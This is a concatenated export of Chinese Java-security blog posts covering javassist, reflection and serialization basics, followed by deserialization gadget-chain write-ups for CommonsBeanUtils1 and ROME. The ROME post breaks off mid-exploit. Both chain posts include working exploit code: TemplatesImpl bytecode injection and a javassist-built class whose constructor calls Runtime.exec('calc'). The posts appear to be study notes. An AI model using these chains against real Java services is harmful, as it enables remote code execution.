\u0026lt;/dependency\u0026gt; 演示 通过不新建类来构建一个不存在的对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 //创建类,这是一个单例对象 ClassPool pool = ClassPool.getDefault(); //需要构建的类 CtClass ctClass = pool.makeClass(\u0026#34;test.Person\u0026#34;); //新增字段 CtField field$name = new CtField(pool.get(\u0026#34;java.lang.String\u0026#34;),\u0026#34;name\u0026#34;,ctClass); //设置访问级别 field$name.setModifiers(Modifier.PRIVATE); //设置继承 ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); //也可以给个初始值 ctClass.addField(field$name,CtField.Initializer.constant(\u0026#34;ygsr\u0026#34;)); //生成get/set方法 ctClass.addMethod(CtNewMethod.setter(\u0026#34;setName\u0026#34;,field$name)); ctClass.addMethod(CtNewMethod.getter(\u0026#34;getName\u0026#34;,field$name)); //新增构造函数 //无参构造函数 CtConstructor cons$no = new CtConstructor(new CtClass[]{},ctClass); cons$no.setBody(\u0026#34;{name = \\\u0026#34;ygsr\\\u0026#34;;}\u0026#34;); ctClass.addConstructor(cons$no); //有参构造方法 CtConstructor cons$one = new CtConstructor(new CtClass[]{pool.get(\u0026#34;java.lang.String\u0026#34;)},ctClass); // $0=this $1,$2,$3... 代表方法参数 cons$one.setBody(\u0026#34;{$0.name = $1;}\u0026#34;); ctClass.addConstructor(cons$one); //或者CtNewConstructor.make CtConstructor constructor = CtNewConstructor.make(\u0026#34;public Person(){ System.out.println(\\\u0026#34;abc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); //两者只能使用一者 //创建一个名为print的方法,无参,无回显,输出name值 CtMethod ctMethod = new CtMethod(CtClass.voidType,\u0026#34;print\u0026#34;,new CtClass[]{},ctClass); ctMethod.setModifiers(Modifier.PUBLIC); ctMethod.setBody(\u0026#34;{System.out.println(name);}\u0026#34;); ctClass.addMethod(ctMethod); //当前目录 final String Path = \u0026#34;E:\\javawork\\timu\\src\\main\\java\\\u0026#34;; //生成.class文件 ctClass.writeFile(Path); //将ctfClass对象转换为字节码数组 byte[] bytes = ctClass.toBytecode(); ","date":"2025-01-08T14:16:54+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/21_hu0ec011a5d8edd549699d0eaf8c37598a_128675_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","title":"动态加载字节码和和javassist"},{"content":"使用场景 反序列化通常就是通过一个类的函数来调用另一个类的函数,从而构成链子\n像一般调用函数,最基本的肯定是\n1 2 person person = new person(***,***);有参就加值,无参就不加值 person.toString();来调用person类的toString方法 但是如果类的构造函数是private修饰\n那么\nperson person = new person();实例化会报错\n报错:java: person(java.lang.String,int) 在 person 中是 private 访问控制\n再或者person类的toString函数是private或者protected修饰\nperson.toString(); 也会报错\n所以需要通过其他方式来实现,这也就是反射做的事\nconstruct实例化对象 Constructor类型存储getConstructor获取的有参或无参构造函数。其中getConstructor参数为需要获取的构造函数形参类型，如String.class，Class[].class newInstance实例化对象，可从原型实例化对象，如person.getClass().newInstance() 当然这种实例化只能调用无参构造函数实例化。可以先获取构造器，再调用有参构造函数实例化，如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 person类 public class person { public String name; public int age; private person(String name,int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String toString() { return \u0026#34;person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } 1 2 3 4 5 Class c = person.class; Constructor personconstructor = c.getDeclaredConstructor(String.class,int.class); personconstructor.setAccessible(true); person p = (person) personconstructor.newInstance(\u0026#34;abc\u0026#34;,21); System.out.println(p.toString()); **getDeclaredConstructor(String.class,int.class)**是获取私有构造函数,参数要对应着构造函数的参数 **personconstructor.setAccessible(true);**构造函数是私有的一定要加上 如果toString函数是私有的,**p.toString()**还是会报错 而要能调用私有函数就需要Field和Method\nField设置属性值 1 2 3 4 5 6 Class pclass = person.class; Field field = pclass.getField(\u0026#34;age\u0026#34;); age是person的属性 field.set(p,20); //p是上面通过构造器实例化的person对象,基于person构造函数是私有的情况下 //如果构造函数不是私有的,那么可以直接new person实例化,就不需要构造器了 System.out.println(p.toString()); 如果属性是私有的就需要以上方法加declared获取私有内容，如getDecalredFields()获取私有属性\n使用setAccessible(true)允许修改私有变量，私有方法等private内容\n1 2 pclass.getDeclaredField(\u0026#34;name\u0026#34;); personconstructor.setAccessible(true); Method调用函数 假如这里修改一下person类的toString函数\n1 2 3 4 5 6 private String toString(String sex) { return \u0026#34;person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, sex=\u0026#39;\u0026#34;+sex+\u0026#34;\u0026#39;\u0026#34;+ \u0026#39;}\u0026#39;; } 变私有了,而且增加了参数\n1 2 3 4 5 6 7 Class pclass = person.class; Method method = pclass.getDeclaredMethod(\u0026#34;toString\u0026#34;,String.class); //获取函数名叫toString的函数,String.class是函数的参数 method.setAccessible(true); //同样要设置为true,和上面一样 System.out.println(method.invoke(p,\u0026#34;man\u0026#34;)); //invoke调用,第一个参数是person的实例对象,第二个就是给参数传参 反射利用 反序列化需要从能invoke执行代码的部分走到readObject，序列化时导致任意代码执行。\n比如Runtime类下的exec方法就能执行系统命令，我们通常使用单形参的这个exec：\njava以是否有static关键字区分了实例方法和静态方法。\n实例方法：必须通过已经实例化的对象来调用。例如，如果你有一个名为MyClass的类，并且它有一个实例方法doSomething()，你需要先创建MyClass的一个实例，然后通过这个实例来调用方法，如MyClass instance = new MyClass(); instance.doSomething();。 静态方法（可以直接调用的方法）：可以通过类名直接调用，无需创建类的实例。例如，如果MyClass有一个静态方法staticMethod()，你可以直接通过类名调用它，如MyClass.staticMethod(); Runtime.exec()就是实例方法，需要在实例化对象上进行调用。Runtime.getRuntime()返回一个单例实例。\n因为Runtime类没有公开的构造方法，getRuntime()方法实际上是返回了该类的一个单例实例。这样做可以确保整个应用程序中只有一个Runtime实例存在，这样可以更好地管理资源和环境交互\n所以使用Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;);就能调用系统计算器。\n但是Runtime类没有继承Serializable，所以不能序列化。InvokerTransformer继承了Serializable，且其transformer调用了invoke，有invoke当然就能用invoke反射调用到Runtime中的exec。\n反射知识博客 反射知识博客\n先把Runtime.getRuntime.exec(\u0026quot;calc\u0026quot;);改为反射调用：\n其中invoke调用格式为：方法.invoke(对象,参数)\ngetMethod调用格式为：对象.getMethod(方法名,该方法参数类型)\n1 2 3 4 Runtime r = Runtime.getRuntime(); Class\u0026lt;?\u0026gt; c = Runtime.class; Method m = c.getMethod(\u0026#34;exec\u0026#34;, String.class); m.invoke(r,\u0026#34;calc\u0026#34;); getRuntime()是不是也能顺便改成反射了呢？\n反射操作 1 2 3 4 5 6 //代码1 Class\u0026lt;Runtime\u0026gt; c = Runtime.class; Method gMethod = c.getMethod(\u0026#34;getRuntime\u0026#34;,null);//getRuntime无参，即null Object r = gMethod.invoke(null,null);//执行getRuntime，静态方法无需实例，第一个参数为null； Method execMethod = c.getMethod(\u0026#34;exec\u0026#34;, String.class);//exec参数类型为string execMethod.invoke(r,\u0026#34;calc\u0026#34;); 正向操作 1 2 Apple apple = new Apple(); apple.setPrice(4); 而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。\n这时候，我们使用 JDK 提供的反射 API 进行反射调用\n1 Class clz = Class.forName(\u0026#34;com.chenshuyi.reflect.Apple\u0026#34;); 这行代码通过Class.forName()方法动态加载名为com.chenshuyi.reflect.Apple的类。注意，类的全限定名（包括包名）必须正确，才能成功加载。返回值clz是Apple类的Class对象，它包含了关于这个类的所有元信息。 1 Method method = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); 通过clz.getMethod()方法，获取Apple类中的setPrice方法。getMethod()需要传递方法名称以及该方法的参数类型，在这里，setPrice方法接受一个int类型的参数。因此，int.class表示参数的类型。 1 Constructor constructor = clz.getConstructor(); 获取Apple类的无参构造函数（默认构造函数）。getConstructor()方法用于获取类的构造方法，若不传参数，则获取无参构造器。 1 Object object = constructor.newInstance(); 使用上面获取的无参构造函数，创建Apple类的实例对象。newInstance()方法用于调用构造器并创建实例，返回值为Object类型。 1 method.invoke(object, 4); 通过Method对象method调用反射的setPrice方法，并传入参数4。invoke()方法的第一个参数是目标对象（即Apple类的实例object），后面是要传递给方法的参数。 完整代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package serialize; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class Apple { private int price; public int getPrice() { return price; } public void setPrice(int price) { this.price = price; } public static void main(String[] args) throws Exception{ //正常的调用 Apple apple = new Apple(); apple.setPrice(5); System.out.println(\u0026#34;Apple Price:\u0026#34; + apple.getPrice()); //使用反射调用 Class clz = Class.forName(\u0026#34;serialize.Apple\u0026#34;); Method setPriceMethod = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); Constructor appleConstructor = clz.getConstructor(); Object appleObj = appleConstructor.newInstance(); setPriceMethod.invoke(appleObj, 14); Method getPriceMethod = clz.getMethod(\u0026#34;getPrice\u0026#34;); System.out.println(\u0026#34;Apple Price:\u0026#34; + getPriceMethod.invoke(appleObj)); } } 反射获取一个对象的步骤 获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;serialize.Apple\u0026quot;);\nserialize.Apple是 可以在运行时加载类,适合在不知道类名时动态加载类\n根据 Class 对象实例获取 Constructor 对象 Constructor appleConstructor = clz.getConstructor();\n使用 Java反射 来获取类中的一个名为 setPrice 的方法，它的参数类型是 int。它的作用是在运行时动态获取某个类的特定方法，之后可以使用这个方法进行操作 使用 Constructor 对象的 newInstance 方法获取反射类对象 Object appleObj= appleConstructor.newInstance();\n获取方法的 Method 对象 Method setPriceMethod = clz.getMethod(\u0026quot;setPrice\u0026quot;, int.class);\n利用 invoke 方法调用方法 setPriceMethod.invoke(appleObj, 14);\n获取反射中的Class对象 在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。\n在 Java API 中，获取 Class 类对象有三种方法：\n第一种，使用 Class.forName 静态方法。当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。\n1 Class clz = Class.forName(\u0026#34;java.lang.String\u0026#34;); 第二种，使用 .class 方法。\n这种方法只适合在编译前就知道操作的 Class。\n1 Class clz = String.class; 第三种，使用类对象的 getClass() 方法。\n1 2 String str = new String(\u0026#34;Hello\u0026#34;); Class clz = str.getClass(); 通过反射创建类对象 通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。\n第一种：通过 Class 对象的 newInstance() 方法。\n1 2 Class clz = Apple.class; Apple apple = (Apple)clz.newInstance(); 第二种：通过 Constructor 对象的 newInstance() 方法\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(); Apple apple = (Apple)constructor.newInstance(); 通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\u0026#34;红富士\u0026#34;, 15); 通过反射获取类属性、方法、构造器 我们通过 Class 对象的 getFields() 方法可以获取 Class 类的属性，但无法获取私有属性。\n1 2 3 4 5 Class clz = Apple.class; Field[] fields = clz.getFields(); for (Field field : fields) { System.out.println(field.getName()); } 输出结果是：\n1 price 而如果使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性：\n1 2 3 4 5 Class clz = Apple.class; Field[] fields = clz.getDeclaredFields(); for (Field field : fields) { System.out.println(field.getName()); } 输出结果是：\n1 2 name price 与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。\n","date":"2025-01-06T15:04:44+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java%E5%8F%8D%E5%B0%84/20_huaae7be4ba70df7325b57cd351ea21ee7_869980_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java%E5%8F%8D%E5%B0%84/","title":"Java反射"},{"content":"代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package serialize; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person(){ } // 构造函数 public Person(String name, int age){ this.name = name; this.age = age; } @Override public String toString(){ return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package serialize; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutput; import java.io.ObjectOutputStream; public class Serialization { public static void serialize(Object obj) throws IOException{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static void main(String[] args) throws Exception{ Person person = new Person(\u0026#34;李二\u0026#34;,22); // System.out.println(person); serialize(person); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package serialize; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class Unserialization { public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } public static void main(String[] args) throws Exception { Person person = (Person) unserialize(\u0026#34;ser.bin\u0026#34;); System.out.println(person); } } Person.java\nSerializable 接口在 Java 中用于实现对象的序列化和反序列化。序列化是将对象转换为字节流，方便传输或存储，反序列化是将字节流还原为对象,如果这里删掉,下面的序列化操作会报错\nSerialization.java\n这里是将序列化操作封装在一个方法体里, 将对象序列化成字节流并写入文件 ser.bin\nUnserialization.java\n读入ser.bin的数据并将字节流反序列化为对象\n运行后\n(1) 序列化类的属性没有实现 Serializable那么在序列化就会报错\n只有实现 了Serializable或者 Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）\nSerializable 接口是 Java 提供的序列化接口，它是一个空接口，所以其实我们不需要实现什么。\n1 2 public interface Serializable { } Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们此处将 Serializable 接口删除掉的话，会导致如下结果。\n(2) 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。\n(3)一个实现 Serializable接口的子类也是可以被序列化的。\n(4) 静态成员变量是不能被序列化\n序列化是针对对象属性的，而静态成员变量是属于类的。\n(5) transient 标识的对象成员变量不参与序列化\n利用反序列化\n在序列化的时候,需要用到writeObject(Object obj) 方法来 将对象序列化为字节流并写入 ObjectOutputStream 中\n在反序列化的时候,需要用到readObject()方法 从 ObjectInputStream 中读取字节流，并将其反序列化为一个对象\n而readObject()可以被重写,从而执行我们想要的代码\n(1)入口类的直接调用危险方法 Person.java添加代码\n运行序列化,再运行反序列化\n这就相当于重写readObject方法,从而弹计算器\n其他的利用都是通过链子穿起来的\n(2) 入口参数中包含可控类，该类有危险方法，readObject时调用 (3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，时调用 (4) 构造函数/静态代码块等类加载时隐式执行 产生漏洞的攻击路线 首先的攻击前提：继承 Serializable\n入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）\n找到入口类之后要找调用链 gadget chain 相同名称、相同类型\n执行类 sink （RCE SSRF 写文件等等）比如exec这种函数\n参考博客 [大佬的博客](Drun1baby/JavaSecurityLearning: 记录一下 Java 安全学习历程，也算是半条学习路线了)\n","date":"2025-01-06T14:56:42+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19_hue185bcc6d60665e4bb8f4cec1e20680e_992322_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Java反序列化"},{"content":"环境 jdk8 依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; CommonsBeanUtils 简介 Apache Commons 工具集下除了 collections 以外还有 BeanUtils ，它主要用于操控 JavaBean 。\n以 Utils 结尾，一般这都是一个工具类/集 先说说 JavaBean 的这个概念\n这里指的就是实体类的 get，set 方法，其实在 IDEA 当中用 Lombok 插件就可以替换 JavaBean。\n关于 JavaBean 的说明可以参考廖雪峰老师的文章\nCommonsBeanUtils 这个包也可以操作 JavaBean，举例如下：\n比如 Baby 是一个最简单的 JavaBean 类\n1 2 3 4 5 6 7 8 9 10 11 public class Baby { private String name = \u0026#34;Drunkbaby\u0026#34;; public String getName(){ return name; } public void setName (String name) { this.name = name; } } 这里定义两个简单的 getter setter 方法，如果用 @Lombok 的注解也是同样的，使用 @Lombok 的注解不需要写 getter setter。\nCommons-BeanUtils 中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下\n1 2 3 4 5 6 7 import org.apache.commons.beanutils.PropertyUtils; public class CBMethods { public static void main(String[] args) throws Exception{ System.out.println(PropertyUtils.getProperty(new Baby(), \u0026#34;name\u0026#34;)); } } 此时，Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值。这个形式就很自然得想到能任意函数调用。\nCommonsBeanUtils1 链子分析 链子尾部 我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的，原因很简单：\n在之前讲动态加载 TemplatesImpl 字节码的时候，我们的链子是这样的\n1 2 3 4 5 6 TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); getOutputProperties调用了newTransformer\n而getOutputProperties很像javabean的OutputProperties的get方法\n可以通过PropertyUtils.getProperty(TemplatesImpl,\u0026quot;outputProperties\u0026quot;)\n从而触发TemplatesImpl.getOutputProperties进入链子尾部\n链子中部 找PropertyUtils.getProperty找到BeanComparator的compare\n链子首部 继续找compare的时候找到PriorityQueue,和cc4链子的前部分链一样\n继续找\n这里在cc4链子的时候就注意到size设为2时刚好进入for循环\n1 2 priorityQueue.add(1); priorityQueue.add(1); 找到入口点\n编写exp 通过反射修改property的值为outputProperties\n1 2 3 4 Class cc = BeanComparator.class; Field field2 = cc.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(beanComparator,\u0026#34;outputProperties\u0026#34;); 因为add也会调用compare,导致序列化前也会弹计算器,所以这里add传入无关参数\n1 2 3 PriorityQueue priorityQueue = new PriorityQueue(beanComparator); priorityQueue.add(1); priorityQueue.add(1); 再通过反射修改queue的值\n1 2 3 4 Class ccc = PriorityQueue.class; Field field3 = ccc.getDeclaredField(\u0026#34;queue\u0026#34;); field3.setAccessible(true); field3.set(priorityQueue,new Object[]{templates,templates}); 为什么不能像cc4那样\n1 2 3 4 5 6 7 8 9 10 TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,chainedTransformer); serialize(priorityQueue); 在创建PriorityQueue对象的时候就给个假的,然后在后面反射修改?\n1 2 priorityQueue.add(templates); priorityQueue.add(templates); add传入的时候刚好到参数里\n因为这里add传入类会报错直接死,所以只能通过后面反射修改queue\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); final BeanComparator beanComparator = new BeanComparator(); // beanComparator.compare(templates,templates); PriorityQueue priorityQueue = new PriorityQueue(beanComparator); priorityQueue.add(1); priorityQueue.add(1); Class c = PriorityQueue.class; Field field1 = c.getDeclaredField(\u0026#34;comparator\u0026#34;); field1.setAccessible(true); field1.set(priorityQueue,beanComparator); Class cc = BeanComparator.class; Field field2 = cc.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(beanComparator,\u0026#34;outputProperties\u0026#34;); Class ccc = PriorityQueue.class; Field field3 = ccc.getDeclaredField(\u0026#34;queue\u0026#34;); field3.setAccessible(true); field3.set(priorityQueue,new Object[]{templates,templates}); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() PropertyUtils.getProperty() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance 到这里链子都过完了\n","date":"2025-01-03T16:18:33+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/15_hudc4c77fa4a7b6e0d5307eb2ce6368816_984136_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/","title":"java反序列化之CommonsBeanUtils1链"},{"content":"前置知识 ROME是什么： 它指的是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。\n他有个特殊的位置就是ROME提供了ToStringBean这个类，提供深入的toString方法对Java Bean进行操作。\n依赖 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 第一条链子 链子尾部 关键就是ROME中自带的ToStringBean类中的toString方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } \u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);\u0026lt;/font\u0026gt;其实和JavaBean中调用getter的方法类似，而下面for循环就是对pds(取到的getter方法)进行反射调用。\n所以这里我们就可以通过ToStringBean类的toString方法来调用getOutputProperties方法，这里我们可以发现有两个参数：\n\u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;this._beanClass\u0026lt;/font\u0026gt;和\u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;this._obj\u0026lt;/font\u0026gt;,根据参数的名我们就可以知道beanClass是javaBean类型的class，obj就是我们要传入的实例化的Templateslmpl类对象\n刚好这两个在构造函数里\n1 ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates); 加上动态加载恶意类的链子就是这条链的尾部\n验证代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); //byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\timu\\\\src\\\\main\\\\java\\\\CISCN2023DeserBug\\\\evil.class\u0026#34;)); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates); toStringBean.toString(); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } } 成功利用\n链子首部 这里直接看其他师傅的利用链\nhashmap#readObject() -\u0026gt; ObjectBean#hashcode() -\u0026gt; EqualsBean#beanHashCode() -\u0026gt; ToStringBean#toString()\n跟链子走一遍,灰常简单,就是注意hashmap.put那里在序列化的时候会进入链子,所以需要给个假的,再反射换成真的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package poc; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import 